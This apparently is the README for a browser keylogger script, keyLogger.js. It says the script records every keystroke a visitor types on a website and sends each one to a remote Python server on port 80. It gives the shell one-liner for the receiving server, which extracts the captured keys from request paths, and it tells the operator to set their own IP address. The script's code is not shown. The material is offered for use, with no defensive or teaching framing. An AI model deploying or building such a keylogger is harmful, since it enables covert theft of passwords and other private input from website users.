keyLogger.js
This script, named "KeyLogger.js," is designed to capture all user keyboard keystrokes while they are browsing a website. When a key is pressed, the event is recorded and sent to a Python3 server via port 80. To run the Python3 server we can use the following command or filter with "Grep" only for the characters that interest us:
python3 -m http.server 80 2>&1 | grep -oP 'GET /\K[^.*\s]+' | sed 's/%20//g'

It's important to note that you should modify the IP address in the code to match your own environment.